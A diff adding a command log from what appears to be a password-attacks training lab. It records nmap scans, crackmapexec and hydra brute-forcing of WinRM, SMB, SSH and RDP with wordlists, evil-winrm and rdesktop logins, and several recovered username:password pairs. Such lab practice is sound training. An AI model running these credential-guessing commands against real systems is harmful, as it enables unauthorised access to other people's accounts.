@@ -1,0 +1,38 @@
+[[Thu May 30 20:25:11 CEST 2024]]: Initialized box academy/password_attacks
+[[Thu May 30 20:25:45 CEST 2024]]: Added target: TARGET
+[[Thu May 30 20:26:14 CEST 2024]]: Running nmap 10.129.15.145 (See /home/kali/machines/academy/password_attacks/nmap_10.129.15.145.txt)
+[[Thu May 30 20:26:59 CEST 2024]]: Running nmap (See /home/kali/machines/academy/password_attacks/nmap.txt)
+[[Thu May 30 20:29:26 CEST 2024]]: Running nmap 10.129.15.145 (See /home/kali/machines/academy/password_attacks/nmap_10.129.15.145.txt)
+[[Thu May 30 20:29:44 CEST 2024]]: Running ping 10.129.15.145 (See /home/kali/machines/academy/password_attacks/ping_10.129.15.145.txt)
+[[Thu May 30 20:30:24 CEST 2024]]: Running ping 10.129.15.145 (See /home/kali/machines/academy/password_attacks/ping_10.129.15.145.txt)
+[[Thu May 30 20:30:27 CEST 2024]]: Running nmap 10.129.15.145 (See /home/kali/machines/academy/password_attacks/nmap_10.129.15.145.txt)
+[[Thu May 30 21:22:37 CEST 2024]]: Running crackmapexec winrm 10.129.15.145 -u /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/rockyou.txt.gz (See /home/kali/machines/academy/password_attacks/crackmapexec_winrm_10.129.15.145_-u_/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt_-p_/usr/share/wordlists/rockyou.txt.gz.txt)
+[[Thu May 30 21:41:30 CEST 2024]]: Running crackmapexec winrm 10.129.15.145 -u /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/rockyou.txt.gz (See /home/kali/machines/academy/password_attacks/crackmapexec_winrm_10.129.15.145_-u_/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt_-p_/usr/share/wordlists/rockyou.txt.gz.txt)
+[[Thu May 30 21:41:43 CEST 2024]]: Running crackmapexec winrm 10.129.15.145 -u /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -p /usr/share/wordlists/rockyou.txt (See /home/kali/machines/academy/password_attacks/crackmapexec_winrm_10.129.15.145_-u_/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt_-p_/usr/share/wordlists/rockyou.txt.txt)
+[[Thu May 30 21:42:46 CEST 2024]]: Added /home/kali/Downloads/Password-Attacks.zip to loot.
+[[Thu May 30 21:43:24 CEST 2024]]: Running crackmapexec winrm 10.129.15.145 -u loot/username.list -p loot/password.list (See /home/kali/machines/academy/password_attacks/crackmapexec_winrm_10.129.15.145_-u_loot/username.list_-p_loot/password.list.txt)
+[[Thu May 30 21:46:20 CEST 2024]]: Running crackmapexec winrm 10.129.15.145 -u loot/username.list -p loot/password.list (See /home/kali/machines/academy/password_attacks/crackmapexec_winrm_10.129.15.145_-u_lootusername.list_-p_lootpassword.list.txt)
+[[Thu May 30 21:47:04 CEST 2024]]: Running evil-winrm 10.129.15.145 -u john -p november (See /home/kali/machines/academy/password_attacks/evil-winrm_10.129.15.145_-u_john_-p_november.txt)
+[[Thu May 30 21:47:19 CEST 2024]]: Running evil-winrm -i 10.129.15.145 -u john -p november (See /home/kali/machines/academy/password_attacks/evil-winrm_-i_10.129.15.145_-u_john_-p_november.txt)
+[[Thu May 30 21:48:17 CEST 2024]]: Running hydra ssh -u loot/username.list -p loot/password.list (See /home/kali/machines/academy/password_attacks/hydra_ssh_-u_lootusername.list_-p_lootpassword.list.txt)
+[[Thu May 30 21:48:35 CEST 2024]]: Running hydra -u loot/username.list -p loot/password.list ssh://10.129.15.145 (See /home/kali/machines/academy/password_attacks/hydra_-u_lootusername.list_-p_lootpassword.list_ssh:10.129.15.145.txt)
+[[Thu May 30 21:49:09 CEST 2024]]: Running hydra -L loot/username.list -P loot/password.list ssh://10.129.15.145 (See /home/kali/machines/academy/password_attacks/hydra_-L_lootusername.list_-P_lootpassword.list_ssh:10.129.15.145.txt)
+[[Thu May 30 21:50:18 CEST 2024]]: Running hydra -L loot/username.list -P loot/password.list rdp://10.129.15.145 (See /home/kali/machines/academy/password_attacks/hydra_-L_lootusername.list_-P_lootpassword.list_rdp:10.129.15.145.txt)
+[[Thu May 30 21:54:07 CEST 2024]]: Running rdesktop (See /home/kali/machines/academy/password_attacks/rdesktop.txt)
+[[Thu May 30 21:54:22 CEST 2024]]: Running rdesktop 10.129.15.145 (See /home/kali/machines/academy/password_attacks/rdesktop_10.129.15.145.txt)
+[[Thu May 30 21:55:18 CEST 2024]]: Running evil-winrm -i 10.129.15.145 -u john -p november (See /home/kali/machines/academy/password_attacks/evil-winrm_-i_10.129.15.145_-u_john_-p_november.txt)
+[[Thu May 30 21:58:06 CEST 2024]]: Running rdesktop (See /home/kali/machines/academy/password_attacks/rdesktop.txt)
+[[Thu May 30 21:58:10 CEST 2024]]: Running rdesktop 10.129.15.145 (See /home/kali/machines/academy/password_attacks/rdesktop_10.129.15.145.txt)
+[[Thu May 30 22:01:01 CEST 2024]]: Running crackmapexec smb 10.129.15.145 -u loot/username.list -p loot/password.list (See /home/kali/machines/academy/password_attacks/crackmapexec_smb_10.129.15.145_-u_lootusername.list_-p_lootpassword.list.txt)
+[[Thu May 30 22:01:52 CEST 2024]]: Running crackmapexec smb 10.129.15.145 -u loot/username.list -p loot/password.list (See /home/kali/machines/academy/password_attacks/crackmapexec_smb_10.129.15.145_-u_lootusername.list_-p_lootpassword.list.txt)
+[[Thu May 30 22:02:07 CEST 2024]]: Running crackmapexec smb 10.129.15.145 -u loot/username.list -p loot/password.list (See /home/kali/machines/academy/password_attacks/crackmapexec_smb_10.129.15.145_-u_lootusername.list_-p_lootpassword.list.txt)
+[[Thu May 30 22:02:27 CEST 2024]]: Running crackmapexec smb 10.129.15.145 -u loot/username.list -p loot/password.list (See /home/kali/machines/academy/password_attacks/crackmapexec_smb_10.129.15.145_-u_lootusername.list_-p_lootpassword.list.txt)
+[[Thu May 30 22:02:50 CEST 2024]]: Added creds: cassie:12345678910
+[[Thu May 30 22:03:06 CEST 2024]]: Added creds: chris:789456123
+[[Thu May 30 22:03:25 CEST 2024]]: Added creds: dennis:rockstar
+[[Thu May 30 22:04:17 CEST 2024]]: Added creds: cassie:12345678910
+[[Thu May 30 22:04:20 CEST 2024]]: Added creds: chris:789456123
+[[Thu May 30 22:04:24 CEST 2024]]: Added creds: dennis:rockstar
+[[Thu May 30 22:05:32 CEST 2024]]: Running crackmapexec smb 10.129.15.145 -u loot/username.list -p loot/password.list (See /home/kali/machines/academy/password_attacks/crackmapexec_smb_10.129.15.145_-u_lootusername.list_-p_lootpassword.list.txt)
+[[Thu May 30 22:12:35 CEST 2024]]: Running hydra -L loot/username.list -P loot/password.list rdp://10.129.15.145 (See /home/kali/machines/academy/password_attacks/hydra_-L_lootusername.list_-P_lootpassword.list_rdp:10.129.15.145.txt)
+[[Thu May 30 22:13:45 CEST 2024]]: Running crackmapexec smb 10.129.15.145 -u loot/username.list -p loot/password.list (See /home/kali/machines/academy/password_attacks/crackmapexec_smb_10.129.15.145_-u_lootusername.list_-p_lootpassword.list.txt)
